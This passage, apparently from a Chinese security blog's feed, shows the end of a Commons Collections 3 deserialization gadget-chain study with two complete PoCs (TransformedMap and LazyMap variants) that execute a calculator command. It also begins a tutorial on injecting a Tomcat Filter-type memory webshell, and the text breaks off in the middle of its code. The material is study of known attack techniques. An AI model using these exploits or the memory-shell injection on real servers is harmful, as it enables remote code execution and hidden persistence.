class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_laster</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        innermap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        Map outermap = TransformedMap.decorate(innermap,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        Class aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = aClass.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object object = constructor.newInstance(Retention.class,outermap);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object object1 = objectInputStream.readObject();<br>        <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/6.png"></p><h1 id="6-完整反序列化POC-2"><a href="#6-完整反序列化POC-2" class="headerlink" title="6.完整反序列化POC-2"></a>6.完整反序列化POC-2</h1><p>利用<code>LazyMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_laster1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innermap,chainedTransformer);<br><br>        Class aclass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = aclass.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap);<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,handler);<br>        handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(handler);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    这篇文章是基于phith0n师傅在代码审计星球里的《Java安全漫谈系列》的第十四篇的文章来进行学习的。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存马学习一-Filter型</title>
    <link href="https://reader-l.github.io/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/"/>
    <id>https://reader-l.github.io/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/</id>
    <published>2021-05-09T01:39:38.000Z</published>
    <updated>2021-05-16T13:17:38.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在现在防护软件的越来越智能化以及开发人员、运维人员等IT行业人员的安全意识越来越高，传统的文件shell大多都气数已尽了，而内存马因其隐蔽性等优点从而越来越盛行。因此有必要的进行学习。</p><h1 id="2-知识简介"><a href="#2-知识简介" class="headerlink" title="2.知识简介"></a>2.知识简介</h1><h2 id="1-什么是Servlet"><a href="#1-什么是Servlet" class="headerlink" title="1.什么是Servlet"></a>1.什么是Servlet</h2><p>​    处理请求和发送响应的过程是由一种叫做<code>Servlet</code>的程序来完成的，并且<code>Servlet</code>是为了解决实现动态页面而衍生的东西。</p><h2 id="2-Tomcat和Servlet的关系"><a href="#2-Tomcat和Servlet的关系" class="headerlink" title="2.Tomcat和Servlet的关系"></a>2.Tomcat和Servlet的关系</h2><p>​    Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户。</p><p>​    其中Tomcat中有四种类型的Servlet容器，从上到下分别是 <code>Engine、Host、Context、Wrapper</code></p><ol><li>Engine，实现类为 <code>org.apache.catalina.core.StandardEngine</code></li><li>Host，实现类为 <code>org.apache.catalina.core.StandardHost</code></li><li>Context，实现类为 <code>org.apache.catalina.core.StandardContext</code></li><li>Wrapper，实现类为 <code>org.apache.catalina.core.StandardWrapper</code></li></ol><p>​    每个Wrapper实例表示一个具体的Servlet定义，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化）</p><h2 id="3-Tomcat-容器"><a href="#3-Tomcat-容器" class="headerlink" title="3.Tomcat 容器"></a>3.Tomcat 容器</h2><p>​    在 Tomcat 中，每个 Host 下可以有多个 Context （Context 是 Host 的子容器）， 每个 Context 都代表一个具体的Web应用，都有一个唯一的路径，在一个 Context 下可以有着多个 Wrapper</p><p>​    Wrapper 主要负责管理 <code>Servlet</code> ，包括的 <code>Servlet</code> 的装载、初始化、执行以及资源回收。</p><h2 id="4-内存马简单介绍"><a href="#4-内存马简单介绍" class="headerlink" title="4.内存马简单介绍"></a>4.内存马简单介绍</h2><p>内存马现在有如下类型：</p><ol><li>servlet-api类<ul><li>filter型</li><li>servlet型</li></ul></li><li>spring类<ul><li>拦截器</li><li>controller型</li></ul></li><li>Java Instrumentation类<ul><li>agent型</li></ul></li></ol><h1 id="3-Filter型的内存马"><a href="#3-Filter型的内存马" class="headerlink" title="3.Filter型的内存马"></a>3.Filter型的内存马</h1><h2 id="1-Filter简介"><a href="#1-Filter简介" class="headerlink" title="1.Filter简介"></a>1.Filter简介</h2><p>​    我们可以通过自定义FIlter来对用户的一些请求进行拦截修改等操作。Filter 程序是一个实现了 Filter 接口的 Java 类，与 Servlet 程序相似，它由 Servlet容器进行调用和执行。这个 Servlet 过滤器就是我们的 filter，当在 web.xml 中注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，这个Filter 就成了 Tomcat 与该 Servlet 程序的通信线路上的一道关卡，该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息是否进行修改。</p><p>​    如下图是其简单的工作流程图：摘自<a href="https://paper.seebug.org/1441/#1jsp-webshell">https://paper.seebug.org/1441/#1jsp-webshell</a></p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/1.png"></p><h2 id="2-Filter实例"><a href="#2-Filter实例" class="headerlink" title="2.Filter实例"></a>2.Filter实例</h2><p>先创建自定义的WebFilter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.Tomcat;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;FilterDemo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Filter创建&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;执行过滤操作&quot;</span>);<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后在web.xml中注册我们的Filter：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>MyFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.example.Tomcat.FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>MyFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>访问web项目的任何路径都会触发：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/2.png"></p><h2 id="3-程序组装FIlter涉及的核心类"><a href="#3-程序组装FIlter涉及的核心类" class="headerlink" title="3.程序组装FIlter涉及的核心类"></a>3.程序组装FIlter涉及的核心类</h2><p>如下也是摘自seebug的文章<a href="https://paper.seebug.org/1441/#1jsp-webshell">https://paper.seebug.org/1441/#1jsp-webshell</a></p><ul><li><strong>Filter</strong>过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。</li><li><strong>FilterChain</strong>过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain</li><li><strong>FilterConfig</strong>过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。</li><li><strong>FilterDef</strong>过滤器的配置和描述</li><li><strong>ApplicationFilterChain</strong>调用过滤器链</li><li><strong>ApplicationFilterConfig</strong>获取过滤器</li><li><strong>ApplicationFilterFactory</strong>组装过滤器链</li></ul><p>还有几个比较重要的类</p><ul><li><strong>WebXml</strong>从名字我们可以就看出来这个一个存放web.xml中内容的类</li><li><strong>ContextConfig</strong>一个web应用的上下文配置类</li><li><strong>StandardContext</strong>一个web应用上下文(Context接口)的标准实现</li><li><strong>StandardWrapperValve</strong>一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。</li></ul><h2 id="4-源码分析"><a href="#4-源码分析" class="headerlink" title="4.源码分析"></a>4.源码分析</h2><p>​    我们将关注点放在<code>StandardWrapperValve</code>，因为在这里会进行过滤器的组装操作，有助于我们理解FIlter创建和调用的流程以及内存马的原理。</p><p>​    首先会先创建一个应用过滤器链：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/3.png"></p><p>跟进<code>ApplicationFilterChain#createFilterChain</code>方法：</p><p>我们查看红框处的代码，首先会调用<code>getParent</code>获取当前<code>Context</code>实例，然后在从<code>Context</code>中找到<code>filterMaps</code>。</p><p>其中，还可以发现<code>filterMaps</code>里存放着我们过滤器的在web.xml中的配置。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/4.png"></p><p>​    发现会遍历<code>FilterMaps</code>中的 <code>FilterMap</code>，如果发现符合当前请求 <code>url</code> 与<code>FilterMap</code>中的 <code>urlPattern</code> 想匹配，就会进入 if 判断语句：调用 <code>findFilterConfig </code>法在<code>filterConfigs</code>中寻找对应 <code>filterName</code>名称的 <code>FilterConfig</code></p><p>我在<code>web.xml</code>中对<code>urlPattern</code>的配置是使用通配符的<code>/*</code>，所以会进入到第一个判断语句：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/5.png"></p><p>如果找到对应名称的<code>filterName</code>的<code>FilterConfig</code>，就会进入到第二个if判断语句：将 <code>filterConfig</code> 添加到 <code>filterChain</code>中。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/6.png"></p><p>​    最后<code> filterChain</code> 组装完毕，重新回到 <code>StandardContextValue </code>中，调用<code> filterChain</code> 的 <code>doFilter </code>方法 ，就会依次调用 Filter 链上的<code> doFilter</code>方法</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/7.png"></p><p>跟进<code>doFilter</code>方法：</p><p>发现会调用<code>internalDoFilter</code>方法</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/8.png"></p><p>跟进<code>internalDoFilter</code>方法：</p><p>发现会依次从 filters 中取出 <code>filterConfig</code>，然后会调用 <code>getFilter() </code>将 filter 从<code>filterConfig </code>中取出，调用 filter 的 <code>doFilter</code>方法。从而调用我们自定义过滤器中的 doFilter 方法，从而触发了相应的代码。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/9.png"></p><p>最后放一张蛋黄师傅（宽字节安全）绘制的图：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/10.png"></p><p>总结：</p><ol><li>根据请求的 URL 从 <code>FilterMaps </code>中找出与之 URL 对应的 Filter 名称。</li><li>根据 Filter 名称去<code>FilterConfigs</code>中寻找对应名称的 <code>FilterConfig</code>。</li><li>找到对应的 <code>FilterConfig </code>之后添加到 <code>FilterChain</code>中，并且返回 <code>FilterChain。</code></li><li><code>filterChain </code>中调用 <code>internalDoFilter </code>遍历获取 chain 中的<code> FilterConfig</code> ，然后从 <code>FilterConfig </code>中获取 Filter，然后调用 Filter 的<code>doFilter</code>方法。</li></ol><h2 id="5-内存马注入"><a href="#5-内存马注入" class="headerlink" title="5.内存马注入"></a>5.内存马注入</h2><p>​    从前面的的分析，可以发现程序在创建过滤器链的时候，关注一下context变量，也就是<code>StandardContext</code>。就会发现它有三个和<code>filter</code>有关的成员变量。</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/11.png"></p><blockquote><ul><li><code>filterConfigs</code>：<code>filterConfig</code>的数组 <code>filterconfig</code>里面有<code>filterdef </code>以及filter对象。</li><li><code>filterDefs</code>：<code>filterRef</code>的数组 <code>FilterDef</code>的作用主要为描述filter的字符串名称与Filter实例的关系。</li><li><code>filterMaps</code>：<code>filterMap</code>的数组(<code>FilterMap</code>中存放了所有filter相关的信息包括<code>filterName</code>和<code>urlPattern</code>。有了这些之后，使用<code>matchFiltersURL</code>函数将每个filter和当前URL进行匹配，匹配成功的通过) <code>filterConfig</code>我们看过，这里注意，<code>filterConfig.filterRef</code>实际和<code>context.filterRef</code>指向的地址一样，也就是同一个东西。</li></ul></blockquote><p>如果我们能够修改这三个变量，或许就能达到利用<code>Filter</code>执行内存注入的操作（达到模拟web.xml的操作）</p><p>大致流程如下：</p><ol><li>获取context</li><li>创建一个恶意 Filter</li><li>利用 FilterDef 对 Filter 进行一个封装</li><li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li><li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li></ol><h3 id="1-首先尝试获取context"><a href="#1-首先尝试获取context" class="headerlink" title="1.首先尝试获取context"></a>1.首先尝试获取context</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">ServletContext servletContext = request.getSession().getServletContext();<br>    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// ApplicationContext 为 ServletContext 的实现类</span><br>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 这样我们就获取到了 context </span><br>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure><h3 id="2-创建恶意Filter"><a href="#2-创建恶意Filter" class="headerlink" title="2.创建恶意Filter"></a>2.创建恶意Filter</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 